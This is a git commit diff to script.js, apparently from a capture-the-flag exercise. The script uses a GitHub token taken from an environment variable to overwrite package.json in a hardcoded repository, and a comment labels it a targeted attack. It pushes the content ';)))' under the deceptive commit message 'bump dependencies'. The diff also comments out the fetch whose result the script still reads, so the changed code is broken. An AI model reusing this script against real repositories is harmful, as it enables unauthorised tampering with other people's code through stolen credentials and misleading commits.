f0b15c6bf4389705028cbf435d23add3af84e051
Dawid Moczadło <dawid@moczadlo.pl>
2021-04-11 16:17:26 +0200

    fix script

--- script.js
+++ script.js
@@ -2,9 +2,9 @@ const github  = require('@actions/github');
 
 const main = async () => {
   const octokit     = github.getOctokit(process.env.FLAG);
-  const fileContent = Buffer
-    .from('{\n}')
-    .toString('base64');
+  // const fileContent = Buffer
+  //   .from('{\n}')
+  //   .toString('base64');
 
   // this is a targeted attack, repo name can be hardcoded
   const owner      = 'whoamipl';
@@ -12,12 +12,12 @@ const main = async () => {
   const branchName = 'main';
   const path       = 'package.json';
 
-  const content = await octokit.repos.getContent({
-    owner: owner,
-    repo:  repo,
-    ref:   branchName,
-    path:  path
-  });
+  // const content = await octokit.repos.getContent({
+  //   owner: owner,
+  //   repo:  repo,
+  //   ref:   branchName,
+  //   path:  path
+  // });
 
   await octokit.repos.createOrUpdateFileContents({
     owner:   owner,
@@ -25,7 +25,7 @@ const main = async () => {
     branch:  branchName,
     path:    path,
     message: 'bump dependencies',
-    content: fileContent,
+    content: ";)))",
     sha:     content.data.sha
   });
 };
